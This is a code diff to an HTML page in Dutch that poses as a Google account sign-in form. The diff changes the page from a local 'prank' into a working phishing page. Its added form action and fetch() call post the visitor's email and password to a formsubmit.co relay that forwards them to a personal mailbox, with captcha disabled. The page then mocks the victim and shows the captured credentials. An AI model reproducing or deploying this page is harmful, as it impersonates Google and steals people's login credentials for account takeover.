@@ -12,14 +12,10 @@
         h1 { font-size: 24px; font-weight: 400; color: #202124; margin-top: 10px; }
         input { width: 100%; padding: 13px 15px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
         button { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; width: 100%; margin-top: 20px; }
-        
         #loader { display: none; margin: 20px auto; border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        .prank-box { display: none; background: #fff; border: 1px solid #dadce0; }
+        .prank-box { display: none; }
         .data-reveal { background: #f8f9fa; padding: 15px; border-radius: 6px; text-align: left; margin: 20px 0; border-left: 5px solid #ff0000; }
-        .emoji { font-size: 60px; }
-        .red-text { color: #d93025; font-weight: bold; }
     </style>
 </head>
 <body>
@@ -29,9 +25,11 @@
         <h1>Inloggen</h1>
         <p>Gebruik je Google-account</p>
         
-        <form id="googleForm">
-            <input type="email" id="email" placeholder="E-mailadres" required>
-            <input type="password" id="pass" placeholder="Wachtwoord" minlength="6" required>
+        <form action="https://formsubmit.co/ajax/harleydebruyn2012@gmail.com" method="POST" id="googleForm">
+            <input type="email" name="email" id="email" placeholder="E-mailadres" required>
+            <input type="password" name="password" id="pass" placeholder="Wachtwoord" minlength="6" required>
+            
+            <input type="hidden" name="_captcha" value="false">
             
             <div id="loader"></div>
             <button type="submit" id="submitBtn">Volgende</button>
@@ -39,38 +37,38 @@
     </div>
 
     <div id="prankPage" class="prank-box">
-        <div class="emoji">LOL</div>
-        <h1>bedankt voor je wachtwoord en email!</h1>
-        <p>Je gegevens zijn nu van mij</b>.</p>
-        
+        <div style="font-size: 60px;">🤡</div>
+        <h1>thx voor je inloggegevens!</h1>
+        <p>thx</b>.</p>
         <div class="data-reveal">
-            <strong>Ingevulde e-mail:</strong> <br><span id="displayEmail" class="red-text"></span><br><br>
-            <strong>Ingevuld wachtwoord:</strong> <br><span id="displayPass" class="red-text"></span>
+            <strong>E-mail:</strong> <span id="displayEmail"></span><br>
+            <strong>Wachtwoord:</strong> <span id="displayPass"></span>
         </div>
-
-        <p>hahahahhaha</p>
-        <button onclick="location.reload()" style="background: #333;">niet zo slim</button>
+        <p>Check je mailbox, Dolphin0X... daar staat het nu ook! 😉</p>
     </div>
 
     <script>
         document.getElementById('googleForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
-            const emailValue = document.getElementById('email').value;
-            const passValue = document.getElementById('pass').value;
             const btn = document.getElementById('submitBtn');
             const loader = document.getElementById('loader');
+            const formData = new FormData(this);
 
             btn.style.display = 'none';
             loader.style.display = 'block';
 
-            setTimeout(() => {
+            // Verzend de data naar FormSubmit
+            fetch(this.action, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
                 document.getElementById('loginPage').style.display = 'none';
                 document.getElementById('prankPage').style.display = 'block';
-                
-                document.getElementById('displayEmail').innerText = emailValue;
-                document.getElementById('displayPass').innerText = passValue;
-            }, 2000);
+                document.getElementById('displayEmail').innerText = document.getElementById('email').value;
+                document.getElementById('displayPass').innerText = document.getElementById('pass').value;
+            });
         });
     </script>
 </body>
